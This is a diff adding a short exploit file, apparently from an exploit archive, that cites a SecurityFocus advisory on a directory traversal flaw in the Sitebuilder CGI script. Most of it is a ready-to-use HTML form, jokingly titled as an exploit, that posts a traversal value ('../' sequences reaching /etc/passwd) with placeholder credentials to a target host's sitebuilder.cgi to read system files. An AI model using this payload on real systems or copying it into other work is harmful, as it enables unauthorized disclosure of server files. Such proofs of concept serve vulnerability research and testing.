@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/8521/info
+
+Sitebuilder is said to be prone to a directory traversal vulnerability, potentially allowing users to disclose the contents of system files. The problem occurs due to the application failing to parse user-supplied input for directory traversal sequences (../) supplied to the 'sitebuilder.cgi' script, thus making it possible to access files outside of the established web root. 
+
+<html><body><p><center>
+<b>Mein 31337 Exploit :-P</b><br>
+<form action="http://targethost.com/cgi-bin/sbcgi/sitebuilder.cgi"
+method=POST>
+<input type="hidden" name="username" value="targetuser">
+<input type="hidden" name="password" value="targetpassword">
+<input type="hidden" name="selectedpage"
+value="../../../../../../../../../../etc/passwd">
+<p><input type="submit" name="action" value="Yes - Use Advanced Editor">
+<p><input type="submit" value="Return to Site Builder">
+</form>
+</center></body></html> 
